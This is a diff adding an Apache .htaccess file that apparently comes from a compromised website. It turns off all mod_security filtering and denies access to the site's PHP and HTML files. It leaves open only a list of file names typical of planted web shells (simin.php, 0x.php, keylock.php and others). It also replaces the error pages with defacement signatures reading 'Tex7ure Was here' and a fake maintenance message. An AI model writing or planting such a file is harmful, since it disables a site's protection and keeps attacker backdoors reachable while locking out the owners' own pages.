@@ -1,0 +1,25 @@
+<IfModule mod_security.c>
+SecFilterEngine Off
+SecFilterScanPOST Off
+SecFilterCheckURLEncoding Off
+SecFilterCheckCookieFormat Off
+SecFilterCheckUnicodeEncoding Off
+SecFilterNormalizeCookies Off
+</IfModule>
+
+<FilesMatch "\.(php|php4|php5|txt|htm|html|shtml|phtml|asp|pl|cgi|ph|Ph)">
+Deny from All
+</FilesMatch>
+
+<FilesMatch "(template.php|panel.php|simin.php|akses.php|index.php|Il.php|litez.php|regen.php|0x.php|zzi.shtml|x.php|min.php|lastmin.php|2--8.php|--28.php|litex.php|keylock.php|inputkey.php|jpg|png|gif|jpeg|css|js|pdf|gif)$">
+Allow from All
+</FilesMatch>
+
+ErrorDocument 404 "<html><head><title>404 No Found</title></html></head><body><h1>Not Found</h1>the document does not exist. Telah di lindungi oleh :<p></p><hr><address>Tex7ure/. Was here</address> </body></html>"
+
+ErrorDocument 403 "<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\"><html><head><title>403 Forbidden</title><style> @import url(http://fonts.googleapis.com/css?family=Ubuntu&subset=latin,greek);</style></head><body style=\"background-color:#000;font-family: 'Ubuntu' 'Lucida Console' 'Courier New' Monospace;\"><center><p style=\"color:white;font-size:11pt\">CakePHP: the rapid development php framework:Errors</p><br><br><br><br><br><br><br><br><br><h1 style=\"color: #2AF623;font-size:70pt\">Forbidden</h1><p style=\"color: #2AF623\">You do not have permission to access this document. telah dilindungi oleh :<hr><p style=\"color:white;\"><i>Tex7ure Was here :p :v</p></i> <br> <h1 style=\"color: #2AF623\">Error Document 403</h1> </p></center></body></html>"
+
+ErrorDocument 500 "Server in update. Please comme back later." 
+
+
+
